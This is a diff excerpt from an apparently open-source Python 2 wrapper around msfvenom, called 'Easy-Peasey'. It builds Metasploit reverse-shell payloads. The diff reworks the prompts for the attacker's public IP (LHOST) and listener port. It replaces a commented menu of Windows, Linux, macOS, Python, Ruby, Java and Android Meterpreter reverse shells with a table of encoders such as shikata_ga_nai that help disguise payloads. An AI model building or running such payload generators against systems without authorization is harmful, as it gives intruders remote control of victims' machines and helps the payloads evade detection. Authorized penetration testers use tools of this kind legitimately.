@@ -31,70 +31,72 @@ print colored('Easy-Peasey, the MSFVenom Payload Generator Targeting All Availab
     #Encoder
     #Encoder iterations
     #Output location
+
+                # payload_Set = opt_Dict[opt_Choice]
+
 class payload_Parameters(object):
-    def __init__(self, LHOST, LPORT, encoder, encoder_iterations, output_format, output_payload):
-        self.LHOST = LHOST
-        self.LPORT = LPORT
+    def __init__(self, encoder, encoder_iterations, LHOST, LPORT, output_format, output_payload):
         self.encoder = encoder
         self.encoder_iterations = encoder_iterations
+        self.LHOST = LHOST
+        self.LPORT = LPORT
         self.output_format = output_format
         self.output_payload = output_payload
     @classmethod
     def from_input(cls):
         return cls(
+            encoder_Dict[str(raw_input("Enter a ENCODER OPTION #: "))],
+            str(raw_input("Enter the number of iterations, usually from 1 to 10: ")),
             str(raw_input("Enter LHOST, your PUBLIC IP Address: ")),
             str(raw_input("Enter LPORT, your LISTENER PORT: ")),
-            str(raw_input("Enter the type of encoder, choose from the list: ")),
-            str(raw_input("Enter the number of iterations, usually from 1 to 5: ")),
             str(raw_input("Enter the format of your output, like 'raw' or 'exe': ")),
             str(raw_input("Enter the full path of your output file: "))
         )
-#Main Menu
-#1. Windows Reverse Shells
-    #a. Inline/Stageless
-        #1. Meterpreter Reverse TCP
-        #2. Meterpreter Reverse HTTP
-        #3. Meterpreter Reverse HTTPS
-    #b. Staged
-        #1. Meterpreter Reverse TCP
-        #2. Meterpreter Reverse HTTP
-        #3. Meterpreter Reverse HTTPS
-#2. Linux Reverse Shells
-        #1. Linux Meterpreter Reverse TCP, Staged
-#3. Mac Reverse Shells (OSX)
-        ##Warn users that OSX Shells are INLINE-Only
-        #1. PowerPC Processor
-        #2. x86 Processor
-#4. Python Reverse Shells
-    #a. INLINE
-        #1. Meterpreter Reverse TCP
-        #2. Meterpreter Reverse HTTP
-        #3. Meterpreter Reverse HTTPS
-    #b. Staged
-        #1. Meterpreter Reverse TCP
-        #2. Meterpreter Reverse HTTP
-        #3. Meterpreter Reverse HTTPS
 
-#5. Ruby Reverse Shells
-    ##INLINE ONLY
-        #1. Reverse TCP Command Shells
-        #2. Reverse TCP SSL Command Shell
-#6. Java Reverse Shells
-    #STAGED payloads ONLY
-        #1. Reverse Meterpreter TCP
-        #2. Reverse Meterpreter HTTP
-        #3. Reverse Meterpreter HTTPS
-#7. Android Reverse Shells
-    #INLINE
-        #1. Reverse Meterpreter TCP
-        #2. Reverse Meterpreter HTTP
-        #3. Reverse Meterpreter HTTPS
-    #STAGED
-        #1. Reverse Meterpreter TCP
-        #2. Reverse Meterpreter HTTP
-        #3. Reverse Meterpreter HTTPS
 
-#Make a dictionary file for encoders
+encoder_Dict = {
+    '1': 'cmd/echo',
+    '2': 'cmd/generic_sh',
+    '3': 'cmd/ifs',
+    '4': 'cmd/perl',
+    '5': 'cmd/powershell_base64',
+    '6': 'cmd/printf_php_mq',
+    '7': 'generic/eicar',
+    '8': 'generic/none',
+    '9': 'mipsbe/byte_xori',
+    '10': 'mipsbe/longxor',
+    '11': 'mipsle/byte_xori',
+    '12': 'mipsle/longxor',
+    '13': 'php/base64',
+    '14': 'ppc/longxor',
+    '15': 'ppc/longxor_tag',
+    '16': 'sparc/longxor_tag',
+    '17': 'x64/xor',
+    '18': 'x64/zutto_dekiru',
+    '19': 'x86/add_sub',
+    '20': 'x86/alpha_mixed',
+    '21': 'x86/alpha_upper',
+    '23': 'x86/avoid_underscore_tolower',
+    '22': 'x86/avoid_utf8_tolower',
+    '24': 'x86/bloxor',
+    '25': 'x86/bmp_polyglot',
+    '26': 'x86/call4_dword_xor',
+    '28': 'x86/context_cpuid',
+    '27': 'x86/context_stat',
+    '29': 'x86/context_time',
+    '30': 'x86/countdown',
+    '31': 'x86/fnstenv_mov',
+    '32': 'x86/jmp_call_additive',
+    '33': 'x86/nonalpha',
+    '34': 'x86/nonupper',
+    '35': 'x86/opt_sub',
+    '36': 'x86/shikata_ga_nai',
+    '37': 'x86/single_static_bit',
+    '38': 'x86/unicode_mixed',
+    '39': 'x86/unicode_upper'
+}
+
+
 def Windows_INLINE():
         opt_Dict = {
             '1': 'windows/meterpreter_reverse_tcp',
